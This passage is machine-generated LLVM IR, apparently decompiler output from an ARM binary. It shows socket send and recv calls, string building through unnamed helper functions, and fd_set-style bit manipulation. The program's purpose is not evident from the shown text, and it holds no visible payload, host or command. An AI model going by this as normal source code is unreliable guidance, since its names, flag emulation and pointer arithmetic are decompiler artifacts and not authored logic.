  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9834 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v2_9840 = add i32 %v2_9834, %stack_var_-20856.0.ph
  store i32 %v2_9840, i32* @r0, align 4
  %v3_9844 = inttoptr i32 %v2_9840 to i8*
  %v4_9844 = call i32 @function_13a7c(i8* %v3_9844, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 %v4_9844, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v1_984c = load i32, i32* @r5, align 4
  %v2_984c = sub i32 %v6_8f58, %v1_984c
  %v3_984c = icmp uge i32 %v6_8f58, %v1_984c
  store i1 %v3_984c, i1* %cpsr_c.global-to-local, align 1
  %v4_984c = xor i32 %v1_984c, %v6_8f58
  %v5_984c = xor i32 %v2_984c, %v6_8f58
  %v6_984c = and i32 %v5_984c, %v4_984c
  %v7_984c = icmp slt i32 %v6_984c, 0
  store i1 %v7_984c, i1* %cpsr_v.global-to-local, align 1
  %v8_984c = icmp slt i32 %v2_984c, 0
  store i1 %v8_984c, i1* %cpsr_n.global-to-local, align 1
  %v9_984c = icmp eq i32 %v6_8f58, %v1_984c
  store i1 %v9_984c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_984c, label %dec_label_pc_9924, label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9664
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9858 = call i32 @function_13128(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9860 = call i32 @function_13a54(i8* %v1_9698)
  %v0_9864 = load i32, i32* @r5, align 4
  store i32 %v0_9864, i32* %r1.global-to-local, align 4
  store i32 %v2_9860, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_9870 = inttoptr i32 %v0_9864 to i32*
  %v3_9870 = call i32 @function_13044(i32 35, i32* %v2_9870)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_9870, i32* %r1.global-to-local, align 4
  %v1_987c = load i32, i32* @r4, align 4
  %v2_987c = add i32 %v1_987c, %stack_var_-20856.0.ph
  store i32 %v2_987c, i32* @r0, align 4
  %v2_9880 = inttoptr i32 %v2_987c to i8*
  %v3_9880 = call i32 @function_13a7c(i8* %v2_9880, i32 %v3_9870)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_9888 = call i32 @function_13070(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9890 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v2_989c = add i32 %v2_9890, %stack_var_-20856.0.ph
  store i32 %v2_989c, i32* @r0, align 4
  %v3_98a0 = inttoptr i32 %v2_989c to i8*
  %v4_98a0 = call i32 @function_13a7c(i8* %v3_98a0, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98a8 = call i32 @function_13a54(i8* %v1_9698)
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* %r1.global-to-local, align 4
  store i32 %v2_98a8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_98b8 = inttoptr i32 %v0_98ac to i32*
  %v3_98b8 = call i32 @function_13044(i32 40, i32* %v2_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_98b8, i32* %r1.global-to-local, align 4
  %v2_98c4 = add i32 %v2_98a8, %stack_var_-20856.0.ph
  store i32 %v2_98c4, i32* @r0, align 4
  %v2_98c8 = inttoptr i32 %v2_98c4 to i8*
  %v3_98c8 = call i32 @function_13a7c(i8* %v2_98c8, i32 %v3_98b8)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98d0 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143ac.83 to i32), i32* %r1.global-to-local, align 4
  %v2_98dc = add i32 %v2_98d0, %stack_var_-20856.0.ph
  store i32 %v2_98dc, i32* @r0, align 4
  %v2_98e0 = inttoptr i32 %v2_98dc to i8*
  %v3_98e0 = call i32 @function_13a7c(i8* %v2_98e0, i32 ptrtoint (i32* @global_var_143ac.83 to i32))
  store i32 %v6_8f58, i32* %r0.global-to-local, align 4
  %v2_98e8 = call i32 @function_13a54(i8* %v1_98e8)
  store i32 %v2_98e8, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_98f4 = call i32 @function_13a54(i8* %v1_9698)
  %v2_98fc = add i32 %v2_98f4, %stack_var_-20856.0.ph
  store i32 %v2_98fc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_9904 = load i32, i32* @r4, align 4
  store i32 %v0_9904, i32* %r0.global-to-local, align 4
  %v3_9908 = trunc i32 %v0_9904 to i8
  %v4_9908 = call i32 @function_13f48(i8 %v3_9908, i32 10, i32 %v2_98fc)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9910 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v2_991c = add i32 %v2_9910, %stack_var_-20856.0.ph
  store i32 %v2_991c, i32* @r0, align 4
  %v3_9920 = inttoptr i32 %v2_991c to i8*
  %v4_9920 = call i32 @function_13a7c(i8* %v3_9920, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 %v4_9920, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_9664, %dec_label_pc_9854
  %v0_9924 = load i32, i32* @r6, align 4
  %v1_9924 = add i32 %v0_9924, 37
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  %v3_9924 = load i32, i32* %v2_9924, align 4
  store i32 %v3_9924, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9928 = icmp slt i32 %v3_9924, 0
  store i1 %v1_9928, i1* %cpsr_n.global-to-local, align 1
  %v2_9928 = icmp eq i32 %v3_9924, 0
  store i1 %v2_9928, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v3_9924, 1
  br i1 %tmp208, label %dec_label_pc_99d0, label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9924
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9934 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_143bc.91 to i32), i32* %r1.global-to-local, align 4
  %v2_9940 = add i32 %v2_9934, %stack_var_-20856.0.ph
  store i32 %v2_9940, i32* @r0, align 4
  %v3_9944 = inttoptr i32 %v2_9940 to i8*
  %v4_9944 = call i32 @function_13a7c(i8* %v3_9944, i32 ptrtoint ([9 x i8]* @global_var_143bc.91 to i32))
  store i32 %v4_9944, i32* %r0.global-to-local, align 4
  %v0_9948 = load i32, i32* @r6, align 4
  %v1_9948 = add i32 %v0_9948, 37
  %v2_9948 = inttoptr i32 %v1_9948 to i32*
  %v3_9948 = load i32, i32* %v2_9948, align 4
  store i32 %v3_9948, i32* %r3.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9950 = icmp slt i32 %v3_9948, 0
  store i1 %v1_9950, i1* %cpsr_n.global-to-local, align 1
  %v2_9950 = icmp eq i32 %v3_9948, 0
  store i1 %v2_9950, i1* %cpsr_z.global-to-local, align 1
  %v0_9954 = load i32, i32* @r5, align 4
  store i32 %v0_9954, i32* %stack_var_-40, align 4
  %tmp209 = icmp slt i32 %v3_9948, 1
  br i1 %tmp209, label %dec_label_pc_99b8, label %dec_label_pc_995c

dec_label_pc_995c:                                ; preds = %dec_label_pc_9930, %dec_label_pc_995c
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9960 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_9968 = load i32, i32* %stack_var_-40, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v1_9970 = and i32 %v3_9968, 33554432
  %v2_9970 = icmp ne i32 %v1_9970, 0
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  %v3_9970 = mul i32 %v3_9968, 128
  %v1_9974 = add i32 %v3_9970, 1472
  %v2_9978 = add i32 %v2_9960, %stack_var_-20856.0.ph
  store i32 %v2_9978, i32* @r0, align 4
  %v0_997c = load i32, i32* @r7, align 4
  %v2_997c = add i32 %v1_9974, %v0_997c
  store i32 %v2_997c, i32* %r1.global-to-local, align 4
  %v2_9980 = inttoptr i32 %v2_9978 to i8*
  %v3_9980 = call i32 @function_13a7c(i8* %v2_9980, i32 %v2_997c)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_9988 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143c8.93 to i32), i32* %r1.global-to-local, align 4
  %v2_9994 = add i32 %v2_9988, %stack_var_-20856.0.ph
  store i32 %v2_9994, i32* @r0, align 4
  %v3_9998 = inttoptr i32 %v2_9994 to i8*
  %v4_9998 = call i32 @function_13a7c(i8* %v3_9998, i32 ptrtoint ([3 x i8]* @global_var_143c8.93 to i32))
  store i32 %v4_9998, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_99a0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_99a0, i32* %r3.global-to-local, align 4
  %v0_99a4 = load i32, i32* @r6, align 4
  %v1_99a4 = add i32 %v0_99a4, 37
  %v2_99a4 = inttoptr i32 %v1_99a4 to i32*
  %v3_99a4 = load i32, i32* %v2_99a4, align 4
  store i32 %v3_99a4, i32* %r2.global-to-local, align 4
  %v1_99a8 = add i32 %v3_99a0, 1
  store i32 %v1_99a8, i32* %ip.global-to-local, align 4
  %v2_99ac = sub i32 %v3_99a4, %v1_99a8
  %v3_99ac = icmp uge i32 %v3_99a4, %v1_99a8
  store i1 %v3_99ac, i1* %cpsr_c.global-to-local, align 1
  %v4_99ac = xor i32 %v3_99a4, %v1_99a8
  %v5_99ac = xor i32 %v2_99ac, %v3_99a4
  %v6_99ac = and i32 %v5_99ac, %v4_99ac
  %v7_99ac = icmp slt i32 %v6_99ac, 0
  store i1 %v7_99ac, i1* %cpsr_v.global-to-local, align 1
  %v8_99ac = icmp slt i32 %v2_99ac, 0
  store i1 %v8_99ac, i1* %cpsr_n.global-to-local, align 1
  %v9_99ac = icmp eq i32 %v3_99a4, %v1_99a8
  store i1 %v9_99ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_99a8, i32* %stack_var_-40, align 4
  %v8_99b4 = icmp sgt i32 %v3_99a4, %v1_99a8
  br i1 %v8_99b4, label %dec_label_pc_995c, label %dec_label_pc_99b8

dec_label_pc_99b8:                                ; preds = %dec_label_pc_995c, %dec_label_pc_9930
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99bc = call i32 @function_13a54(i8* %v1_9698)
  %v2_99c4 = add i32 %v2_99bc, %stack_var_-20856.0.ph
  store i32 %v2_99c4, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v3_99cc = inttoptr i32 %v2_99c4 to i8*
  %v4_99cc = call i32 @function_13a7c(i8* %v3_99cc, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 %v4_99cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_9924, %dec_label_pc_99b8
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99d4 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), i32* %r1.global-to-local, align 4
  %v2_99e0 = add i32 %v2_99d4, %stack_var_-20856.0.ph
  store i32 %v2_99e0, i32* @r0, align 4
  %v3_99e4 = inttoptr i32 %v2_99e0 to i8*
  %v4_99e4 = call i32 @function_13a7c(i8* %v3_99e4, i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32))
  store i32 %v4_99e4, i32* %r0.global-to-local, align 4
  store i32 %v6_8f58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_99ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_99ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99ec, label %dec_label_pc_9a0c, label %dec_label_pc_99f4

dec_label_pc_99f4:                                ; preds = %dec_label_pc_99d0
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_99f8 = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v6_8f58, i32* %r1.global-to-local, align 4
  %v2_9a04 = add i32 %v2_99f8, %stack_var_-20856.0.ph
  store i32 %v2_9a04, i32* @r0, align 4
  %v2_9a08 = inttoptr i32 %v2_9a04 to i8*
  %v3_9a08 = call i32 @function_13a7c(i8* %v2_9a08, i32 %v6_8f58)
  store i32 %v3_9a08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %dec_label_pc_99d0, %dec_label_pc_99f4
  %v0_9a0c = load i32, i32* @r7, align 4
  %v1_9a0c = add i32 %v0_9a0c, 1440
  store i32 %v1_9a0c, i32* %r4.global-to-local, align 4
  %v0_9a10 = load i32, i32* @r6, align 4
  store i32 %v0_9a10, i32* %r0.global-to-local, align 4
  store i32 %v1_9a0c, i32* %r1.global-to-local, align 4
  %v2_9a18 = inttoptr i32 %v0_9a10 to i8*
  %v3_9a18 = call i32 @function_13e34(i8* %v2_9a18, i32 %v1_9a0c)
  store i32 %v3_9a18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a1c = icmp slt i32 %v3_9a18, 0
  store i1 %v1_9a1c, i1* %cpsr_n.global-to-local, align 1
  %v2_9a1c = icmp eq i32 %v3_9a18, 0
  store i1 %v2_9a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a1c, label %dec_label_pc_a364, label %dec_label_pc_9a24

dec_label_pc_9a24:                                ; preds = %dec_label_pc_9a0c, %dec_label_pc_a364
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_9a28 = load i32, i32* @r6, align 4
  %v1_9a28 = add i32 %v0_9a28, -1431
  %v2_9a28 = inttoptr i32 %v1_9a28 to i32*
  %v3_9a28 = load i32, i32* %v2_9a28, align 4
  store i32 %v3_9a28, i32* @r4, align 4
  %v2_9a2c = call i32 @function_13a54(i8* %v1_9698)
  store i32 %stack_var_-20856.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_9a2c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9a3c = load i32, i32* @r4, align 4
  store i32 %v0_9a3c, i32* %r0.global-to-local, align 4
  %v4_9a40 = call i32 @_send(i32 %v0_9a3c, i32 %stack_var_-20856.0.ph, i32 %v2_9a2c, i32 16384)
  store i32 %v4_9a40, i32* %r0.global-to-local, align 4
  %v0_9a44 = load i32, i32* @r6, align 4
  %v1_9a44 = add i32 %v0_9a44, -1431
  %v2_9a44 = inttoptr i32 %v1_9a44 to i32*
  %v3_9a44 = load i32, i32* %v2_9a44, align 4
  store i32 %v3_9a44, i32* %r0.global-to-local, align 4
  %v3_9a4c = udiv i32 %v3_9a44, 32
  %v3_9a50 = mul nuw nsw i32 %v3_9a4c, 4
  store i32 %v2_94a0, i32* %lr.global-to-local, align 4
  %v2_9a58 = add i32 %v3_9a50, %v2_94a0
  store i32 %v2_9a58, i32* %r3.global-to-local, align 4
  %v1_9a5c = add i32 %v2_9a58, -164
  %v2_9a5c = inttoptr i32 %v1_9a5c to i32*
  %v3_9a5c = load i32, i32* %v2_9a5c, align 4
  %v1_9a60 = urem i32 %v3_9a44, 32
  %v1_9a64 = load i32, i32* %fp.global-to-local, align 4
  %v7_9a64 = shl i32 %v1_9a64, %v1_9a60
  %v8_9a64 = or i32 %v7_9a64, %v3_9a5c
  store i32 %v8_9a64, i32* %r2.global-to-local, align 4
  %v0_9a68 = load i32, i32* @sl, align 4
  %v2_9a68 = sub i32 %v0_9a68, %v3_9a44
  %v3_9a68 = icmp uge i32 %v0_9a68, %v3_9a44
  store i1 %v3_9a68, i1* %cpsr_c.global-to-local, align 1
  %v4_9a68 = xor i32 %v0_9a68, %v3_9a44
  %v5_9a68 = xor i32 %v2_9a68, %v0_9a68
  %v6_9a68 = and i32 %v5_9a68, %v4_9a68
  %v7_9a68 = icmp slt i32 %v6_9a68, 0
  store i1 %v7_9a68, i1* %cpsr_v.global-to-local, align 1
  %v8_9a68 = icmp slt i32 %v2_9a68, 0
  store i1 %v8_9a68, i1* %cpsr_n.global-to-local, align 1
  %v9_9a68 = icmp eq i32 %v0_9a68, %v3_9a44
  store i1 %v9_9a68, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r1.global-to-local, align 4
  store i32 %v8_9a64, i32* %v2_9a5c, align 4
  %v0_9a74 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a74 = load i32, i32* @r6, align 4
  %v2_9a74 = add i32 %v1_9a74, -1419
  %v3_9a74 = inttoptr i32 %v2_9a74 to i32*
  store i32 %v0_9a74, i32* %v3_9a74, align 4
  %v0_9a78 = load i32, i32* %r1.global-to-local, align 4
  %v1_9a78 = trunc i32 %v0_9a78 to i8
  %v2_9a78 = load i32, i32* @r6, align 4
  %v3_9a78 = add i32 %v2_9a78, -1427
  %v4_9a78 = inttoptr i32 %v3_9a78 to i8*
  store i8 %v1_9a78, i8* %v4_9a78, align 1
  %v0_9a7c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_9a7c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_9a7c = xor i1 %v0_9a7c, %v1_9a7c
  br i1 %v2_9a7c, label %dec_label_pc_9a80, label %dec_label_pc_9388

dec_label_pc_9a80:                                ; preds = %dec_label_pc_9a24
  %v0_9a80 = load i32, i32* %r0.global-to-local, align 4
  %v1_9a80 = add i32 %v0_9a80, 1
  store i32 %v1_9a80, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9a88:                                ; preds = %dec_label_pc_9360
  %v1_9a88 = add i32 %v3_9658, -1431
  %v2_9a88 = inttoptr i32 %v1_9a88 to i32*
  %v3_9a88 = load i32, i32* %v2_9a88, align 4
  store i32 %v3_9a88, i32* %r0.global-to-local, align 4
  %v3_9a90 = udiv i32 %v3_9a88, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9a94 = mul nuw nsw i32 %v3_9a90, 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_9a9c = add i32 %v3_9a94, %v2_94a0
  store i32 %v2_9a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9aa0:                                ; preds = %.thread24, %.thread35, %dec_label_pc_9a88
  %v1_9aac = phi i32 [ %v4_9344, %.thread35 ], [ %v4_9324, %.thread24 ], [ %v3_9a88, %dec_label_pc_9a88 ]
  %v1_9ab0 = phi i32 [ %v3_9358, %.thread35 ], [ %v3_9338, %.thread24 ], [ %v2_9a9c, %dec_label_pc_9a88 ]
  %v1_9aa0 = add i32 %v1_9ab0, -164
  %v2_9aa0 = inttoptr i32 %v1_9aa0 to i32*
  %v3_9aa0 = load i32, i32* %v2_9aa0, align 4
  %v1_9aa4 = urem i32 %v1_9aac, 32
  store i32 %v1_9aa4, i32* %r1.global-to-local, align 4
  %v1_9aa8 = load i32, i32* %fp.global-to-local, align 4
  %v7_9aa8 = shl i32 %v1_9aa8, %v1_9aa4
  %v8_9aa8 = or i32 %v7_9aa8, %v3_9aa0
  store i32 %v8_9aa8, i32* %r2.global-to-local, align 4
  %v0_9aac = load i32, i32* @sl, align 4
  %v2_9aac = sub i32 %v0_9aac, %v1_9aac
  %v3_9aac = icmp uge i32 %v0_9aac, %v1_9aac
  store i1 %v3_9aac, i1* %cpsr_c.global-to-local, align 1
  %v4_9aac = xor i32 %v0_9aac, %v1_9aac
  %v5_9aac = xor i32 %v2_9aac, %v0_9aac
  %v6_9aac = and i32 %v5_9aac, %v4_9aac
  %v7_9aac = icmp slt i32 %v6_9aac, 0
  store i1 %v7_9aac, i1* %cpsr_v.global-to-local, align 1
  %v8_9aac = icmp slt i32 %v2_9aac, 0
  store i1 %v8_9aac, i1* %cpsr_n.global-to-local, align 1
  %v9_9aac = icmp eq i32 %v0_9aac, %v1_9aac
  store i1 %v9_9aac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9aa8, i32* %v2_9aa0, align 4
  %v2_9ab4 = xor i1 %v8_9aac, %v7_9aac
  br i1 %v2_9ab4, label %dec_label_pc_9ab8, label %dec_label_pc_9388

dec_label_pc_9ab8:                                ; preds = %dec_label_pc_9aa0
  %v0_9ab8 = load i32, i32* %r0.global-to-local, align 4
  %v1_9ab8 = add i32 %v0_9ab8, 1
  store i32 %v1_9ab8, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_9ac0:                                ; preds = %dec_label_pc_9310
  %v1_9ac0 = add i32 %v3_9658, -1423
  %v2_9ac0 = inttoptr i32 %v1_9ac0 to i32*
  %v3_9ac0 = load i32, i32* %v2_9ac0, align 4
  %v1_9ac4 = load i32, i32* %sb.global-to-local, align 4
  %v2_9ac4 = sub i32 %v1_9ac4, %v3_9ac0
  store i32 %v2_9ac4, i32* %r3.global-to-local, align 4
  %v1_9ac8 = add i32 %v2_9ac4, -30
  %v2_9ac8 = icmp ugt i32 %v2_9ac4, 29
  store i1 %v2_9ac8, i1* %cpsr_c.global-to-local, align 1
  %v3_9ac8 = sub i32 29, %v2_9ac4
  %v4_9ac8 = and i32 %v3_9ac8, %v2_9ac4
  %v5_9ac8 = icmp slt i32 %v4_9ac8, 0
  store i1 %v5_9ac8, i1* %cpsr_v.global-to-local, align 1
  %v6_9ac8 = icmp slt i32 %v1_9ac8, 0
  store i1 %v6_9ac8, i1* %cpsr_n.global-to-local, align 1
  %v7_9ac8 = icmp eq i32 %v2_9ac4, 30
  store i1 %v7_9ac8, i1* %cpsr_z.global-to-local, align 1
  %v2_9acc = xor i1 %v7_9ac8, true
  %v3_9acc = and i1 %v2_9ac8, %v2_9acc
  br i1 %v3_9acc, label %dec_label_pc_9370, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ac0
  %v1_9ad0 = add i32 %v3_9658, -1431
  %v2_9ad0 = inttoptr i32 %v1_9ad0 to i32*
  %v3_9ad0 = load i32, i32* %v2_9ad0, align 4
  store i32 %v3_9ad0, i32* %r0.global-to-local, align 4
  %v3_9ad8 = udiv i32 %v3_9ad0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9adc = mul nuw nsw i32 %v3_9ad8, 4
  store i32 %v3_9adc, i32* %r3.global-to-local, align 4
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94a8

dec_label_pc_9b28:                                ; preds = %dec_label_pc_9574
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9b30 = call i32 @function_13af4(i32 %v2_8fd8, i32 10240)
  store i32 %v2_9b30, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9b3c = load i32, i32* @r8, align 4
  %v1_9b3c = add i32 %v0_9b3c, -1456
  %v2_9b3c = inttoptr i32 %v1_9b3c to i32*
  %v3_9b3c = load i32, i32* %v2_9b3c, align 4
  store i32 %v3_9b3c, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9b48 = call i32 @_recv(i32 %v3_9b3c, i32 %v2_8fd8, i32 10240, i32 16386)
  store i32 %v4_9b48, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b50 = icmp slt i32 %v4_9b48, 0
  store i1 %v1_9b50, i1* %cpsr_n.global-to-local, align 1
  %v2_9b50 = icmp eq i32 %v4_9b48, 0
  store i1 %v2_9b50, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  %tmp210 = icmp slt i32 %v4_9b48, 1
  br i1 %tmp210, label %dec_label_pc_a7d4, label %dec_label_pc_9b5c

dec_label_pc_9b5c:                                ; preds = %dec_label_pc_9b28
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  store i32 %v4_9b48, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9b6c = call i32 @function_13b18(i32 %v2_8fd8, i32 %v4_9b48, i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), i32 4)
  store i32 %v5_9b6c, i32* %r0.global-to-local, align 4
  %v1_9b70 = add i32 %v5_9b6c, 1
  %v2_9b70 = icmp eq i32 %v5_9b6c, -1
  store i1 %v2_9b70, i1* %cpsr_c.global-to-local, align 1
  %v3_9b70 = sub i32 0, %v5_9b6c
  %v4_9b70 = and i32 %v1_9b70, %v3_9b70
  %v5_9b70 = icmp slt i32 %v4_9b70, 0
  store i1 %v5_9b70, i1* %cpsr_v.global-to-local, align 1
  %v6_9b70 = icmp slt i32 %v1_9b70, 0
  store i1 %v6_9b70, i1* %cpsr_n.global-to-local, align 1
  %v7_9b70 = icmp eq i32 %v1_9b70, 0
  store i1 %v7_9b70, i1* %cpsr_z.global-to-local, align 1
  %v0_a66c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v7_9b70, label %dec_label_pc_a66c, label %dec_label_pc_9b78

dec_label_pc_9b78:                                ; preds = %dec_label_pc_9b5c, %dec_label_pc_a66c
  store i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v0_a66c, i32* %r1.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_9b88 = call i32 @function_13b18(i32 %v2_8fd8, i32 %v0_a66c, i32 ptrtoint ([5 x i8]* @global_var_143cc.95 to i32), i32 4)
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_9b94 = add i32 %v5_9b88, %v2_94a0
  store i32 %v2_9b94, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v3_9b9c = load i32, i32* @r6, align 4
  %v4_9b9c = add i32 %v3_9b9c, %v2_9b94
  %v5_9b9c = inttoptr i32 %v4_9b9c to i8*
  store i8 0, i8* %v5_9b9c, align 1
  %v0_9ba0 = load i32, i32* @r5, align 4
  store i32 %v0_9ba0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9ba8 = inttoptr i32 %v0_9ba0 to i32*
  %v3_9ba8 = call i32 @function_13044(i32 46, i32* %v2_9ba8)
  %v0_9bac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9bac, i32* @r1, align 4
  store i32 %v3_9ba8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_9bb8 = call i32 @function_13da8(i8* %tmp199, i32 %v0_9bac, i32 %v3_9ba8)
  store i32 %v4_9bb8, i32* %r0.global-to-local, align 4
  %v1_9bbc = add i32 %v4_9bb8, 1
  %v2_9bbc = icmp eq i32 %v4_9bb8, -1
  store i1 %v2_9bbc, i1* %cpsr_c.global-to-local, align 1
  %v3_9bbc = sub i32 0, %v4_9bb8
  %v4_9bbc = and i32 %v1_9bbc, %v3_9bbc
  %v5_9bbc = icmp slt i32 %v4_9bbc, 0
  store i1 %v5_9bbc, i1* %cpsr_v.global-to-local, align 1
  %v6_9bbc = icmp slt i32 %v1_9bbc, 0
  store i1 %v6_9bbc, i1* %cpsr_n.global-to-local, align 1
  %v7_9bbc = icmp eq i32 %v1_9bbc, 0
